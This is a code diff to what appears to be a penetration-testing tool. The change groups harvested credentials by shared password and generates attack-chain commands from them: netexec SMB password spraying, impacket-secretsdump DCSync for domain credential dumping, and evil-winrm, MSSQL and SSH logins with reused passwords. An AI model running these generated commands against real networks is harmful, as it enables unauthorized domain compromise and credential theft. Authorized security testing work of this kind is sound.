@@ -246,53 +246,85 @@ def run(report, store, ui=None):
     # iter-14: e.creds is now dict-of-list. iter-15: pick the BEST occurrence
     # (real user display + deterministic src path) so attribution stays stable
     # across runs and points at the most informative source.
-    for (ulc, pw), occurrences in e.creds.items():
-        def _cred_quality(o):
-            d, s, l = o
-            return (d == "<user>", s or "", l or 0)
-        best = sorted(occurrences, key=_cred_quality)[0]
-        disp, src, ln = best
-        cred_count = len(occurrences)
-        mach = _machine(src, root)
-        smb = svc_on(mach, "smb") or dc_for(mach)
-        utoken = ul or f"'{disp}'"
-        # iter-16: spray safety gating
-        #   - lockout-threshold guardrail when known
-        #   - -k flag only when user-cred carries kerberos context (FQDN
-        #     username or netexec_db kerberos hit); blind addition causes
-        #     "kerberos config missing" errors when $KRB5CCNAME is unset.
-        #   - DCSync caveat moved to its own command (was an inline #-comment
-        #     that the operator could miss)
-        lockout = getattr(store, "lockout_threshold", None)
-        lockout_note = ""
-        if lockout and lockout > 0:
-            lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
-                            f"do NOT spray more attempts than {lockout - 1} per user")
-        has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
-        krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
-        chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
-            crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
-            commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
-                      f"# AFTER confirming Pwn3d! on {smb}, then dcsync (gates the secretsdump):",
-                      f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"],
-            src=src, line=ln))
-        wh = svc_on(mach, "winrm")
-        if wh:
-            chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
-                crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
-                commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
-        mh = svc_on(mach, "mssql")
-        if mh:
-            chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
-                crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
-                commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
-        sh = svc_on(mach, "ssh")
-        if sh:
-            # iter-13: SSH password login is more reliable than MSSQL
-            # -windows-auth (which depends on a successful AD mapping).
-            chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
-                crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
-                commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))
+    # iter-34: dedup by pw. When N>=2 distinct KNOWN users share a pw, emit
+    # ONE aggregate R1 chain telling the operator to spray with users.txt
+    # instead of N separate 'reuse USER:pw' chains. Keeps per-user chains
+    # when only one user has the pw (still valuable attribution).
+    from collections import defaultdict
+    by_pw = defaultdict(list)
+    for (ulc, pw), occs in e.creds.items():
+        by_pw[pw].append((ulc, occs))
+    for pw, users_occs in by_pw.items():
+        known_users = {u for u, _ in users_occs if u}
+        aggregate = len(known_users) >= 2
+        if aggregate:
+            # pick the earliest / most-informative anchor across all users
+            all_occs = [(u, o) for u, occs in users_occs for o in occs]
+            all_occs.sort(key=lambda t: (t[1][0] == "<user>", t[1][1] or "",
+                                          t[1][2] or 0))
+            disp0, src, ln = all_occs[0][1]
+            mach = _machine(src, root)
+            smb = svc_on(mach, "smb") or dc_for(mach)
+            utoken = "users.txt"
+            summary = (f"pw '{pw}' shared across {len(known_users)} users "
+                       f"({', '.join(sorted(known_users)[:4])}"
+                       f"{', ...' if len(known_users) > 4 else ''})")
+            lockout = getattr(store, "lockout_threshold", None)
+            lockout_note = ""
+            if lockout and lockout > 0:
+                lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
+                                f"do NOT spray more attempts than {lockout - 1} per user")
+            chains.append(Chain("R1", "spray", summary,
+                crit=8, conf=0.85, ready=1.5, prox=_prox(store, smb),
+                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' "
+                          f"--continue-on-success{lockout_note}"],
+                src=src, line=ln, count=len(known_users)))
+            continue
+        # Non-aggregate: per-user R1 + R3/R4/R5 emissions (existing behavior).
+        for ulc, occurrences in users_occs:
+            def _cred_quality(o):
+                d, s, l = o
+                return (d == "<user>", s or "", l or 0)
+            best = sorted(occurrences, key=_cred_quality)[0]
+            disp, src, ln = best
+            mach = _machine(src, root)
+            smb = svc_on(mach, "smb") or dc_for(mach)
+            utoken = ul or f"'{disp}'"
+            # iter-16: spray safety gating
+            #   - lockout-threshold guardrail when known
+            #   - -k flag only when user-cred carries kerberos context (FQDN
+            #     username or netexec_db kerberos hit); blind addition causes
+            #     "kerberos config missing" errors when $KRB5CCNAME is unset.
+            lockout = getattr(store, "lockout_threshold", None)
+            lockout_note = ""
+            if lockout and lockout > 0:
+                lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
+                                f"do NOT spray more attempts than {lockout - 1} per user")
+            has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
+            krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
+            chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
+                crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
+                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
+                          f"# AFTER confirming Pwn3d! on {smb}, then dcsync (gates the secretsdump):",
+                          f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"],
+                src=src, line=ln))
+            wh = svc_on(mach, "winrm")
+            if wh:
+                chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
+                    crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
+                    commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
+            mh = svc_on(mach, "mssql")
+            if mh:
+                chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
+                    crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
+                    commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
+            sh = svc_on(mach, "ssh")
+            if sh:
+                # iter-13: SSH password login is more reliable than MSSQL
+                # -windows-auth (which depends on a successful AD mapping).
+                chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
+                    crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
+                    commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))
 
     # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
     # iter-13 false-confidence fix: tag hash origin (local-SAM vs domain) so
